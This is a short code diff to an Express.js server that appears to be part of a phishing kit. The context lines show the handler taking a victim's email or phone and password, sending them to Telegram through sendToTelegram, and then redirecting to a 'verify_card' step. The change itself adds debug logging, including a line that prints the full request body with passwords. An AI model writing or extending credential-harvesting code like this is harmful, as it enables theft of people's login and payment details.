@@ -53,7 +53,7 @@ app.post('/api', async (req, res) => {
   const step = req.body.step || 'email';
   let error = '';
 
-  console.log('Received POST request for step:', step); // Debugging
+  console.log('Received POST request for step:', step, 'Body:', req.body); // Debugging
 
   if (step === 'email') {
     const { email_or_phone, password } = req.body;
@@ -66,6 +66,7 @@ app.post('/api', async (req, res) => {
         `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
       await sendToTelegram(message);
+      console.log('Redirecting to /?step=verify_card'); // Debugging
       return res.redirect('/?step=verify_card');
     } else {
       error = 'Please enter both email/phone and password';
